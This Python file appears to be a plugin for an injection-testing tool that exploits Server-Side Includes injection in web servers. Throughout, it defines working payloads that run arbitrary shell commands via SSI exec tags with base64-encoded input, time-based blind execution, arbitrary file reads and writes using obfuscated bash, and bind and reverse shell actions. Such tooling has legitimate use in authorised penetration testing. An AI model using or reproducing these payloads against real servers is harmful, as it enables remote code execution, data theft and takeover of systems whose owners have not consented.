from core.plugin import Plugin
from core import bash
from utils import closures
from utils import rand
import re


class SSI(Plugin):
    legacy_plugin = True
    header_type = "cat"
    priority = 9
    plugin_info = {
        "Description": """Server-Side Includes injection""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Initial SSTImap plugin
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'render': """{code}""",
                'header': """<!--#set var="h" value="{header[1]}" -->{header[0]}<!--#echo var="h" -->""",
                'trailer': """<!--#set var="t" value="{trailer[1]}" -->{trailer[0]}<!--#echo var="t" -->""",
                'test_render': f"""<!--#set var="b" value="{rand.randstrings[1]}" -->{rand.randstrings[0]}<!--#echo var="b" -->""",
                'test_render_expected': f'{rand.randstrings[0]}{rand.randstrings[1]}'
            },
            # No error-based or boolean-based, as SSI do not produce user-controlled errors and fail silently
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            'execute': {
                'execute': """<!--#exec cmd="`echo '{code_b64p}'|base64 -d`" -->""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2],
                'test_os': """uname""",
                'test_os_expected': r'^[\w-]+$'
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """<!--#exec cmd="`echo '{code_b64p}'|base64 -d`&&sleep {delay}" -->"""
            },
            'read': {
                'call': 'execute',
                'read': """base64<'{path}'"""
            },
            'write': {
                'call': 'execute',
                'write': """bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}""",
                'truncate': """bash -c {{echo,-n,}}>{path}""",
            },
            'md5': {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'{path}'|head -c 32"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            }
        })

        self.set_contexts([
            {'level': 0},
            # SSI shares tag endings with HTML comment
            {'level': 2, 'prefix': '{closure} -->', 'suffix': '<!-- a', 'closures': ctx_closures},
        ])

    language = 'SSI'

    def rendered_detected(self):
        # SSI has no real evaluation, hence the checks are done using the command execution action.
        error = self.get('error', False)
        action_execute = self.actions.get('execute', {}).copy()
        if error and 'execute_error' in self.actions:
            action_execute.update(self.actions.get('execute_error', {}))
        test_cmd_code = action_execute.get('test_cmd')
        test_cmd_code_expected = action_execute.get('test_cmd_expected')
        if test_cmd_code and test_cmd_code_expected and test_cmd_code_expected == self.execute(test_cmd_code).rstrip():
            self.set('execute', True)
            if self.actions.get('write'):
                self.set('write', True)
            if self.actions.get('read') or (error and self.actions.get('read_error')):
                self.set('read', True)
            if self.actions.get('bind_shell'):
                self.set('bind_shell', True)
            if self.actions.get('reverse_shell'):
                self.set('reverse_shell', True)
            test_os_code = action_execute.get('test_os')
            test_os_code_expected = action_execute.get('test_os_expected')
            if test_os_code and test_os_code_expected:
                os = self.execute(test_os_code)
                if os and re.search(test_os_code_expected, os):
                    self.set('os', os)

    def blind_detected(self):
        # SSI has no real evaluation, hence the checks are done using the command execution action.
        # Since execution has been used to detect blind injection, let's assume execute_blind as set.
        self.set('execute_blind', True)
        if self.actions.get('write'):
            self.set('write', True)
        if self.actions.get('bind_shell'):
            self.set('bind_shell', True)
        if self.actions.get('reverse_shell'):
            self.set('reverse_shell', True)


ctx_closures = {
        1: [
            closures.close_double_quotes + closures.empty
        ],
        2: [
            closures.close_double_quotes + closures.empty
        ],
        3: [
            closures.close_double_quotes + closures.empty
        ],
        4: [
            closures.close_double_quotes + closures.empty
        ],
        5: [
            closures.close_double_quotes + closures.empty
        ]
}
